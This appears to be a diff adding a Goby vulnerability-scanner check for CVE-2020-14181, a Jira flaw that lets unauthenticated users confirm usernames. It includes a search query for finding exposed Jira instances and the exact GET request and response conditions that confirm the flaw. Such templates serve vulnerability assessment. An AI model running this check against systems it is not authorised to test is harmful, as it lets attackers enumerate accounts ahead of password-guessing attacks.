@@ -1,0 +1,53 @@
+{
+      "Name": "Atlassian Jira user information disclosure (CVE-2020-14181)",
+      "Level": "0",
+      "Tags": [
+            "Disclosure of Sensitive Information"
+      ],
+      "GobyQuery": "(app=\"JIRA\" || title=\"System Dashboard\")",
+      "Description": "There is an unauthorized access vulnerability in JIRA. Unauthorized users can directly query the existence of a user name through an API interface. This interface is different from cve-2019-8446 and cve-2019-3403. It is a new interface. If JIRA is exposed to the public network, unauthorized users can directly access the interface",
+      "Product": "Atlassian Jira",
+      "Homepage": "https://pingcode.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>Can be blasted user name, know the correct user name<br></p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/secure/ViewUserHover.jspa?username=peiqipeiqipeiqi",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "peiqipeiqipeiqi",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-04 20:57:19",
+      "GobyVersion": "1.8.255"
+}
